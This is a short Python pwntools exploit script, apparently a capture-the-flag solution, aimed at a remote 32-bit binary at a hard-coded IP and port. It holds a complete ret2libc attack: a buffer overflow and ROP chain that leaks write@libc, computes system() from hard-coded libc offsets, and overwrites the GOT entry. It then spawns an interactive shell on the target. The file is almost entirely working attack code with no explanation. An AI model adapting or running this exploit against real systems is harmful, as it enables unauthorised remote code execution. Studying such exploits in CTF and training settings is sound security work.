#!/usr/bin/python3

from pwn import *

# target: flag.txt @ 147.182.223.56:7777

#After ROPgadget and disassembling the functions in GDB
write_plt = 0x08049060
write_got = 0x804c018
pop_pop_pop_ret = 0x08049249 
read_plt = 0x08049030
ed_string = 0x8048289

#Offsets from libc6-i386_2.33-0ubuntu5_amd64
offset___libc_start_main_ret = 0x1ea1d
offset_system = 0x00045960
offset_dup2 = 0x000f64b0
offset_puts = 0x00070d30
offset_read = 0x000f5700
offset_write = 0x000f57c0
offset_str_bin_sh = 0x195c69

def main():
        p = remote("147.182.223.56", 7777)

        # create your payload
        payload = b"A" * 37
        payload += p32(write_plt)
        payload += p32(pop_pop_pop_ret)
        payload += p32(1)
        payload += p32(write_got)
        payload += p32(4)
        payload += p32(read_plt)
        payload += p32(pop_pop_pop_ret)
        payload += p32(0)
        payload += p32(write_got)
        payload += p32(4)

        #Stage 4
        payload += p32(write_plt)
        payload += p32(0xdeadbeef)
        payload += p32(ed_string)
        p.send(payload)

        #Stage 1
        p.recv(25)
        data = p.recv(4)
        write_libc = u32(data)
        log.info("Leaked write@libc addr: 0x%x", write_libc)

        #Stage 2
        libc_start_addr = write_libc - offset_write
        system_libc = libc_start_addr + offset_system
        log.info("system@libc addr: 0x%x", system_libc)

        #Stage 3
        p.send(p32(system_libc))


        # Change to interactive mode
        p.interactive()


if __name__ == "__main__":
        main()
